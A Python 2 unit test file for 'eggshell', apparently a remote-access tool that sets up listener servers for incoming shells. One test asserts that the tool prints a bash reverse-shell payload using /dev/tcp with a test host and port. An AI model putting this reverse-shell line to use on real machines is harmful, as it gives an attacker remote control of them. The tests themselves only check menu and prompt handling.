import sys
import unittest
import mock # For Python 2, ensure 'mock' library is installed (pip install mock)
from StringIO import StringIO # Python 2's StringIO

# Assuming 'eggshell.py' is in the same directory or accessible via PYTHONPATH
import eggshell

class TestEggShell(unittest.TestCase):

    def setUp(self):
        """
        Set up mock objects for dependencies before each test.
        This patches the global 'h' (Helper instance) and 'server' (ESServer instance)
        within the 'eggshell' module for the duration of each test.
        """
        # Mock the Helper instance (eggshell.h)
        self.mock_h = mock.Mock(spec=eggshell.Helper)
        self.mock_h.CMD_CLEAR = "mock_clear_command"
        self.mock_h.GREEN = ""  # Empty strings to simplify output assertions
        self.mock_h.RED = ""
        self.mock_h.COLOR_INFO = "" # Default to empty, can be overridden in specific tests
        self.mock_h.WHITE = ""
        self.mock_h.ENDC = ""       # Default to empty
        self.mock_h.NES = "[eggshell_mock]> " # Mocked prompt prefix
        # Ensure strinfo is a mock method if it's called
        self.mock_h.strinfo = mock.Mock()

        # Mock the ESServer instance (eggshell.server)
        self.mock_server = mock.Mock(spec=eggshell.ESServer)
        self.mock_server.getip = mock.Mock() # Ensure getip is a mock method
        self.mock_server.singleServer = mock.Mock()
        self.mock_server.multiServer = mock.Mock()

        # Apply patches to the 'eggshell' module's global instances
        self.patcher_h = mock.patch('eggshell.h', self.mock_h)
        self.patcher_server = mock.patch('eggshell.server', self.mock_server)

        self.patcher_h.start()
        self.patcher_server.start()

        # Mock os.system to prevent actual system calls
        self.patcher_os_system = mock.patch('os.system')
        self.mock_os_system = self.patcher_os_system.start()

        # Mock sys.exit to prevent tests from terminating prematurely
        # In Python 2, exit() is equivalent to sys.exit()
        self.patcher_sys_exit = mock.patch('sys.exit')
        self.mock_sys_exit = self.patcher_sys_exit.start()

    def tearDown(self):
        """
        Stop all patchers after each test.
        """
        self.patcher_h.stop()
        self.patcher_server.stop()
        self.patcher_os_system.stop()
        self.patcher_sys_exit.stop()

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_defaults(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", ""] # User presses Enter for LHOST, then LPORT

        expected_lhost = "192.168.1.100"
        expected_lport = 4444

        result = eggshell.promptHostPort()

        self.assertEqual(result, [expected_lhost, expected_lport])
        self.mock_h.strinfo.assert_any_call("LHOST = " + expected_lhost)
        self.mock_h.strinfo.assert_any_call("LPORT = " + str(expected_lport))
        mock_raw_input.assert_any_call(self.mock_h.NES + "SET LHOST (Leave blank for 192.168.1.100)>")
        mock_raw_input.assert_any_call(self.mock_h.NES + "SET LPORT (Leave blank for 4444)>")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_custom_host_default_port(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["10.0.0.1", ""]

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["10.0.0.1", 4444])
        self.mock_h.strinfo.assert_any_call("LHOST = 10.0.0.1")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_default_host_custom_port(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", "8080"]

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["192.168.1.100", 8080])
        self.mock_h.strinfo.assert_any_call("LPORT = 8080")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_invalid_port_non_int_then_valid(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", "abc", "5555"] # LHOST, invalid LPORT, valid LPORT

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["192.168.1.100", 5555])
        self.mock_h.strinfo.assert_any_call("invalid port, please enter a valid integer")
        self.mock_h.strinfo.assert_any_call("LPORT = 5555")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_invalid_port_too_low_then_valid(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", "80", "5555"] # LHOST, LPORT < 1024, valid LPORT

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["192.168.1.100", 5555])
        self.mock_h.strinfo.assert_any_call("invalid port, please enter a value >= 1024")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_keyboard_interrupt_on_lhost(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = [KeyboardInterrupt]

        result = eggshell.promptHostPort()
        self.assertIsNone(result)
        self.mock_h.strinfo.assert_not_called() # Should exit before printing LHOST/LPORT

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_keyboard_interrupt_on_lport(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", KeyboardInterrupt] # LHOST, then Ctrl+C for LPORT

        result = eggshell.promptHostPort()
        self.assertIsNone(result)
        self.mock_h.strinfo.assert_any_call("LHOST = 192.168.1.100") # LHOST is set before LPORT interrupt

    @mock.patch('eggshell.raw_input')
    def test_promptServerRun_decline_start(self, mock_raw_input):
        mock_raw_input.return_value = "n" # Input for "Start Server? (Y/n): "
        host, port = "127.0.0.1", 1234

        eggshell.promptServerRun(host, port)

        self.mock_server.singleServer.assert_not_called()
        self.mock_server.multiServer.assert_not_called()
        mock_raw_input.assert_called_once_with(self.mock_h.NES + "Start Server? (Y/n): ")

    @mock.patch('eggshell.raw_input')
    def test_promptServerRun_start_single_server_default_yes(self, mock_raw_input):
        mock_raw_input.side_effect = ["", "N"] # Default Yes to start, No to multi
        host, port = "127.0.0.1", 1234

        eggshell.promptServerRun(host, port)

        self.mock_server.singleServer.assert_called_once_with(host, port)
        self.mock_server.multiServer.assert_not_called()
        self.assertEqual(mock_raw_input.call_count, 2)
        mock_raw_input.assert_any_call(self.mock_h.NES + "Start Server? (Y/n): ")
        mock_raw_input.assert_any_call(self.mock_h.NES + "Multi Server? (Y/n): ")


    @mock.patch('eggshell.raw_input')
    def test_promptServerRun_start_multi_server_explicit_yes(self, mock_raw_input):
        mock_raw_input.side_effect = ["Y", "y"] # Yes to start, Yes to multi
        host, port = "127.0.0.1", 1234

        eggshell.promptServerRun(host, port)

        self.mock_server.multiServer.assert_called_once_with(host, port)
        self.mock_server.singleServer.assert_not_called()
        self.assertEqual(mock_raw_input.call_count, 2)

    def test_menuExit(self):
        eggshell.menuExit()
        self.mock_sys_exit.assert_called_once_with()

    @mock.patch('eggshell.promptHostPort')
    def test_menuStartServer_with_valid_host_port(self, mock_promptHostPort):
        mock_promptHostPort.return_value = ["127.0.0.1", 1234]

        eggshell.menuStartServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.singleServer.assert_called_once_with("127.0.0.1", 1234)

    @mock.patch('eggshell.promptHostPort')
    def test_menuStartServer_with_no_host_port(self, mock_promptHostPort):
        mock_promptHostPort.return_value = None # User cancelled prompt

        eggshell.menuStartServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.singleServer.assert_not_called()

    @mock.patch('eggshell.promptHostPort')
    @mock.patch('eggshell.menu') # Mock the recursive call to menu()
    def test_menuStartMultiServer_with_valid_host_port(self, mock_menu, mock_promptHostPort):
        mock_promptHostPort.return_value = ["127.0.0.1", 5678]

        eggshell.menuStartMultiServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.multiServer.assert_called_once_with("127.0.0.1", 5678)
        mock_menu.assert_called_once() # Check that menu() is called again

    @mock.patch('eggshell.promptHostPort')
    @mock.patch('eggshell.menu') # Mock the recursive call to menu()
    def test_menuStartMultiServer_with_no_host_port(self, mock_menu, mock_promptHostPort):
        mock_promptHostPort.return_value = None # User cancelled prompt

        eggshell.menuStartMultiServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.multiServer.assert_not_called()
        mock_menu.assert_not_called() # menu() should not be called if host/port prompt is cancelled

    @mock.patch('eggshell.promptHostPort')
    @mock.patch('eggshell.promptServerRun')
    @mock.patch('sys.stdout', new_callable=StringIO) # Capture print output
    def test_menuCreateScript_generates_payload_and_prompts_run(self, mock_stdout, mock_promptServerRun, mock_promptHostPort):
        test_host = "10.0.0.2"
        test_port = 9999
        mock_promptHostPort.return_value = [test_host, test_port]

        # Override color codes for this specific test to check their presence
        self.mock_h.COLOR_INFO = "[INFO_PREFIX]"
        self.mock_h.ENDC = "[INFO_SUFFIX]"

        eggshell.menuCreateScript()

        mock_promptHostPort.assert_called_once()

        # Verify printed output includes the (mocked) color codes and payload
        expected_payload_output = "[INFO_PREFIX]bash &> /dev/tcp/{}/{} 0>&1[INFO_SUFFIX]\n".format(test_host, test_port)
        self.assertEqual(mock_stdout.getvalue(), expected_payload_output)

        # Verify promptServerRun is called
        mock_promptServerRun.assert_called_once_with(test_host, test_port)

    @mock.patch('eggshell.promptHostPort')
    @mock.patch('eggshell.promptServerRun')
    @mock.patch('sys.stdout', new_callable=StringIO)
    def test_menuCreateScript_no_host_port(self, mock_stdout, mock_promptServerRun, mock_promptHostPort):
        mock_promptHostPort.return_value = None # User cancelled prompt

        eggshell.menuCreateScript()

        mock_promptHostPort.assert_called_once()
        self.assertEqual(mock_stdout.getvalue(), "") # Nothing should be printed
        mock_promptServerRun.assert_not_called()

    # --- Tests for eggshell.menu() ---

    @mock.patch('eggshell.raw_input')
    @mock.patch('eggshell.menuStartServer')
    def test_menu_action_start_server(self, mock_menuStartServer, mock_raw_input):
        """Test menu navigates to Start Server on input '1'."""
        mock_raw_input.side_effect = ['1', 'exit'] # Select '1', then 'exit' menu
        # Assuming menu prompt is self.mock_h.NES
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        mock_menuStartServer.assert_called_once()
        self.mock_sys_exit.assert_called_once() # Called due to 'exit' command
        self.assertEqual(mock_raw_input.call_count, 2)
        mock_raw_input.assert_any_call(expected_prompt)

    @mock.patch('eggshell.raw_input')
    @mock.patch('eggshell.menuStartMultiServer')
    def test_menu_action_start_multi_server(self, mock_menuStartMultiServer, mock_raw_input):
        """Test menu navigates to Start Multi-Server on input '2'."""
        mock_raw_input.side_effect = ['2', 'exit'] # Select '2', then 'exit' menu
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        mock_menuStartMultiServer.assert_called_once()
        self.mock_sys_exit.assert_called_once()
        self.assertEqual(mock_raw_input.call_count, 2)
        mock_raw_input.assert_any_call(expected_prompt)

    @mock.patch('eggshell.raw_input')
    @mock.patch('eggshell.menuCreateScript')
    def test_menu_action_create_script(self, mock_menuCreateScript, mock_raw_input):
        """Test menu navigates to Create Script on input '3'."""
        mock_raw_input.side_effect = ['3', 'exit'] # Select '3', then 'exit' menu
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        mock_menuCreateScript.assert_called_once()
        self.mock_sys_exit.assert_called_once()
        self.assertEqual(mock_raw_input.call_count, 2)
        mock_raw_input.assert_any_call(expected_prompt)

    @mock.patch('eggshell.raw_input')
    # self.mock_os_system is set up in setUp
    def test_menu_action_clear_screen(self, mock_raw_input):
        """Test menu calls os.system with clear command on input 'clear'."""
        mock_raw_input.side_effect = ['clear', 'exit'] # Select 'clear', then 'exit' menu
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        self.mock_os_system.assert_called_once_with(self.mock_h.CMD_CLEAR)
        self.mock_sys_exit.assert_called_once()
        self.assertEqual(mock_raw_input.call_count, 2)
        mock_raw_input.assert_any_call(expected_prompt)

    @mock.patch('eggshell.raw_input')
    def test_menu_action_exit_command(self, mock_raw_input):
        """Test menu calls sys.exit (via menuExit) on input 'exit'."""
        mock_raw_input.return_value = 'exit'
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        self.mock_sys_exit.assert_called_once()
        mock_raw_input.assert_called_once_with(expected_prompt)

    @mock.patch('eggshell.raw_input')
    def test_menu_action_quit_command(self, mock_raw_input):
        """Test menu calls sys.exit (via menuExit) on input 'quit'."""
        mock_raw_input.return_value = 'quit'
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        self.mock_sys_exit.assert_called_once()
        mock_raw_input.assert_called_once_with(expected_prompt)

    @mock.patch('sys.stdout', new_callable=StringIO)
    @mock.patch('eggshell.raw_input')
    @mock.patch('eggshell.menuStartServer') # To handle the valid choice after invalid
    def test_menu_action_invalid_input_then_valid(self, mock_menuStartServer, mock_raw_input, mock_stdout):
        """Test menu handles invalid input, prints error, then processes valid input."""
        mock_raw_input.side_effect = ['invalid_choice', '1', 'exit']
        expected_prompt = self.mock_h.NES

        # Assuming h.RED and h.ENDC are "" for simplified output check
        # and the error message contains "Invalid"
        # e.g., print h.RED + "Invalid option." + h.ENDC

        eggshell.menu()

        self.assertIn("Invalid", mock_stdout.getvalue()) # Check for error message
        mock_menuStartServer.assert_called_once()
        self.mock_sys_exit.assert_called_once()
        self.assertEqual(mock_raw_input.call_count, 3)
        mock_raw_input.assert_any_call(expected_prompt)

    @mock.patch('eggshell.raw_input')
    def test_menu_action_keyboard_interrupt(self, mock_raw_input):
        """Test menu handles KeyboardInterrupt by calling sys.exit (via menuExit)."""
        mock_raw_input.side_effect = KeyboardInterrupt
        expected_prompt = self.mock_h.NES

        eggshell.menu()

        self.mock_sys_exit.assert_called_once()
        # raw_input is called once before raising KeyboardInterrupt
        mock_raw_input.assert_called_once_with(expected_prompt)

if __name__ == '__main__':
    unittest.main()